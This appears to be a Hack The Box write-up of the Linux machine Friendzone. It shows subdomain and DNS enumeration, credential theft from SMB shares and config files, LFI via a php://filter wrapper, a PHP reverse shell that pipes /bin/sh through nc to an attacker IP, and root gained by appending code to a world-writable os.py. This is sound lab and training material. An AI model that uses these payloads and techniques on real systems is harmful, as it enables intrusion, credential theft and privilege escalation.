---
title: HTB -- Friendzone
date: 2022-01-20
layout: single
header:
  teaser: assets/images/htb/friend/teaser.png
excerpt: Friendzone offers instruction on web subdomain brute-forcing as well as dns concepts. A user shell as www-data is found when the attacker finds LFI within an upload functionality. Further enumeration as the www-data user reveals plaintext passwords allowing us to login as the user `friend`. From here pspy shows us a python script running with root permissions. In tandem with this script, we find that writing to python modules is possible, allowing us to gain root privs.
classes: wide
categories:
  - hackthebox
tags:
  - hackthebox
  - OSCP
  - linux
  - web
---

### Summary
![](/assets/images/htb/friend/teaser.png)

Friendzone offers instruction on web subdomain brute-forcing as well as dns concepts. A user shell as www-data is found when the attacker finds LFI within an upload functionality. Further enumeration as the www-data user reveals plaintext passwords allowing us to login as the user `friend`. From here pspy shows us a python script running with root permissions. In tandem with this script, we find that writing to python modules is possible, allowing us to gain root privs.

## Recon

```
$ nmap friend.htb

PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
```

Webserver with ssh, ftp and dns server by the looks of it. DNS is always interesting to explore, it's worth double checking that we do a good job enumerating subdomains on the web end of things.


## Web
![](/assets/images/htb/friend/web.png)
* Domain brute force
  * `ffuf -w ~/subdomains-top1million-110000.txt -u http://10.10.10.123 -H "Host: FUZZ.friend.htb" | grep -v '200'`
  * No results
* Web page brute force
  * `feroxbuster -u http://friend.htb -e -r -x php txt -o pages.txt`
  * troll robots.txt
  * troll wordpress directory...
* Lesson learned:
  * add friendzoneportal.red to `/etc/hosts`
  * opens up new doors for enumeration

```
feroxbuster -u https://friendzone.red -k --proxy 127.0.0.1:8080

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://friendzone.red
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/kali/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💎  Proxy                 │ 127.0.0.1:8080
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      315c https://friendzone.red/js
301        9l       28w      318c https://friendzone.red/admin
301        9l       28w      318c https://friendzone.red/js/js

```

Note the page -> https://friendzone.red/js/js which contains the following
```
Testing some functions !

I'am trying not to break things !
UjZuVlF6cHc4MTE2NDEyMTM2MTRNbGRnd1J5Tlh6
```
This hash doesn't mean much, cyberchef can't decide if it's anything so i'm leaving it be for now.

#### FTP
Anonymous sessions not allowed here, nothing else to test.

### DNS
Zone transfer doesn't show us much

```
dig axfr @10.10.10.123                                                                                                               1 ⚙

; <<>> DiG 9.16.15-Debian <<>> axfr @10.10.10.123
; (1 server found)
;; global options: +cmd
;; Query time: 12 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Mon Jan 03 07:07:25 EST 2022
;; MSG SIZE  rcvd: 56
```

## SMB
Initial enumeration shows us a general dir we can read from and a dev share we can read/write to.

```
smbmap -H 10.10.10.123                                                                       
[+] Guest session       IP: 10.10.10.123:445    Name: friend.htb                                        
     Disk                                                       Permissions     Comment
     ----                                                       -----------     -------
     print$                                             NO ACCESS       Printer Drivers
     Files                                              NO ACCESS       FriendZone Samba Server Files /etc/Files
     general                                            READ ONLY       FriendZone Samba Server Files
     Development                                        READ, WRITE     FriendZone Samba Server Files
     IPC$                                               NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))

```

Recursively printing all files and `creds.txt` pops out, we can download it
```
smbmap -H 10.10.10.123 -R
[+] Guest session       IP: 10.10.10.123:445    Name: friend.htb                                        
     Disk                                                       Permissions     Comment
     ----                                                       -----------     -------
     print$                                             NO ACCESS       Printer Drivers
     Files                                              NO ACCESS       FriendZone Samba Server Files /etc/Files
     general                                            READ ONLY       FriendZone Samba Server Files
     .\general\*
     dr--r--r--                0 Wed Jan 16 15:10:51 2019       .
     dr--r--r--                0 Wed Jan 23 16:51:02 2019       ..
     fr--r--r--               57 Tue Oct  9 19:52:42 2018       creds.txt
     Development                                        READ, WRITE     FriendZone Samba Server Files
     .\Development\*
     dr--r--r--                0 Mon Jan  3 07:00:23 2022       .
     dr--r--r--                0 Wed Jan 23 16:51:02 2019       ..
     IPC$                                               NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))

```

We can connect with smbclient and grab all files recursively
```
smbclient //10.10.10.123/general                                                                                                     1 ⨯
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse
smb: \> prompt
smb: \> mget *
getting file \creds.txt of size 57 as creds.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
```

Now that the creds are obtained...
```
cat creds.txt                             
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

`admin:WORKWORKHhallelujah@#`

Time to try logging into various different services with these creds, FTP, ssh...box has other trolls, best to not get overly invested in this just in case it is one.

With the initial smbmap we saw a Development drive to write to, could be interesting to play around with uploads down the line.



### DNS -- round 2
After finding the `friendzone.red` domain from the main page hint

```
dig axfr friendzone.red @10.10.10.123                                                                                                1 ⚙

; <<>> DiG 9.16.15-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 12 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Mon Jan 03 07:42:54 EST 2022
;; XFR size: 8 records (messages 1, bytes 289)
```

Way more subdomains! This is alot of information to go through, make sure to add all these to `/etc/hosts`

## administrator1.friendzone.red

Creds from before `admin:WORKWORKHhallelujah@#`

Once we login and go to the dashboard, it suggests the use of a script param due to a noobie developer.

![](/assets/images/htb/friend/hint.png)

From here we can test for LFI with basics such as `../../../../../etc/passwd`. When this doesn't work we can try some evasion techniques like [php filtering](https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb) which is used to further allow access.

For our case, we want to grab the dashboard page, which fails with regular LFI. Instead we need to wrap it in a php filter
```
# Before filter
?image_id=a.jpg&pagename=dashboard

# After filtering
?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=dashboard

# Final LFI
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=dashboard
```
This gives us the base64 for the dashboard code! Cyberchef lets us decode and manipulate the output as needed.

```php
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>
```


Below is a reverse shell we can upload and gain access with.

```php
<?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 4444 >/tmp/f');
?>
```

Remember that smb share we could write to before? `-c` lets us run a command, it's time to share our reverse shell with this box.
```
smbclient -N //10.10.10.123/Development -c 'put revshell.php revshell.php'
```

```
# Grab this url for a shell
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/revshell

# Spin up a listener
nc -nlvp 4444
```

### Webshell to friend

One of the first things to check is the website itself, where we find creds stored in plaintext within `mysql_data.conf`

```
$ cd www
$ ls
admin
friendzone
friendzoneportal
friendzoneportaladmin
html
mysql_data.conf
uploads
$ cat *.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

Lets try `friend:Agpyu12!0.213$` all over, which immediately works for ssh.

## friend to root

Copying files here has one caveat, where the wget command has `ftp` prepended to it (i.e. a grab for http://10.10.10.10/a.txt would become ftp://10.10.10.10/a.txt). Instead of going against the grain, just spin up a python ftp server to copy over linpeas and pspy.
```
# Attacking Box
python3 -m pyftpdlib -p21 -w                                                                                                         1 ⨯
/home/kali/.local/lib/python3.9/site-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-01-03 09:10:15] concurrency model: async
[I 2022-01-03 09:10:15] masquerade (NAT) address: None
[I 2022-01-03 09:10:15] passive ports: None
[I 2022-01-03 09:10:15] >>> starting FTP server on 0.0.0.0:21, pid=197979 <<<
[I 2022-01-03 09:10:29] 10.10.10.123:34028-[] FTP session opened (connect)

# Victim
friend@FriendZone:/tmp$ wget 10.10.14.24:21/a.zip
--2022-01-03 16:17:07--  http://10.10.14.24:21/a.zip
Connecting to 10.10.14.24:21... connected.
HTTP request sent, awaiting response... 200 No headers, assuming HTTP/0.9
Length: unspecified
Saving to: ‘a.zip’
```
Despite the workaround, this was moving at about 200 kb/s so just used smb to transfer instead (same method we used to upload the revshell).

### pspy

Crontab action coming from a server admin folder
```
2022/01/03 16:25:36 CMD: UID=0    PID=10     | 
2022/01/03 16:25:36 CMD: UID=0    PID=1      | /sbin/init splash 
2022/01/03 16:26:01 CMD: UID=0    PID=3556   | /usr/bin/python /opt/server_admin/reporter.py 
2022/01/03 16:26:01 CMD: UID=0    PID=3555   | /bin/sh -c /opt/server_admin/reporter.py 
2022/01/03 16:26:01 CMD: UID=0    PID=3554   | /usr/sbin/CRON -f 
```

Investigation of the reporter.py script shows a mail server written in python.
```python
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

Half of it is commented out, it boils down to this code
```python
!/usr/bin/python
import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"
print "[+] Trying to send email to %s"%to_address
```

From this, there is only one item left to look at hijacking, and thats the python libraries used within.

Sure enough, we can write to the os module

```
friend@FriendZone:/opt/server_admin$ ls -al /usr/lib/python2.7/os.py
-rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py
```

Adding this to the bottom of the file lets us get the root flag

```
import os

os.system('cat /root/root.txt > /tmp/root.txt')
```

## Lessons Learned
* Update `/etc/hosts` as you enumerate subdomains
  * add hints from webpages too
* Use php filtering when testing for LFI
* Fall back to old methods for transfering files if needed
  * don't have to use simplehttp server every time

